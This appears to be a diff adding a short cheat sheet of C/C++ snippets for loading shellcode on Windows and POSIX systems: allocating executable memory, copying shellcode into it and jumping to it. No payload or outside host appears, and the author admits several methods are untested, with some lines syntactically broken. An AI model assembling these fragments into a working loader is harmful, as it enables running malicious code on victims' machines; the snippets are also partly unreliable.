@@ -1,0 +1,42 @@
+//The idea
+/*
+	1. Allocate r/w/e memory to copy the shellcode
+	2. Find a way to copy the shellcode into that mem addr
+	3. Jump to the allocated mem addr and execute code
+  
+  I have not tested all of them but they should do the work :)
+
+*/
+
+//Free mem 
+
+VirtualAlloc(NULL,shellcodeSize, MEM_COMMIT,PAGE_EXECUTE_READWRITE); //Windows -rwx
+mmap(NULL, shellcodeSize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, 0, 0); // POSIX systems 
+VirtualAllocExNuma(GetCurrentProcess(), NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0) // Windows
+
+//Move memory
+
+RtlMoveMemory(&destMemAddr,&source,shellcodeSize); // Windows
+MoveMemory(&destMemAddr,&source,shellcodeSize);
+CopyMemory(&destMemAddr,&source,shellcodeSize);
+FillMemory(&destMemAddr,1,ByteByteOfShellcode);
+
+memcpy(&destMemAddr,&source,shellcodeSize); // Windows Linux
+strncpy() //Windows
+
+
+//Execute code ways
+
+void *ptr = (void *) addressOfVirtualAlloc;
+goto *ptr; // Windows Linux
+
+
+CreateThread(NULL,0,LPTHREAD_START_ROUTINE(addressOfVirtualAlloc),NULL,0,NULL); // Windows
+while(1){
+    Sleep(1);
+} // c++
+
+void (*execShellcode)(void) = (void (*)(void))addressOfVirtualAlloc;
+execShellcode(); // Windows Linux
+
+((void(*)())addressOfVirtualAlloc)(); // Windows Linux
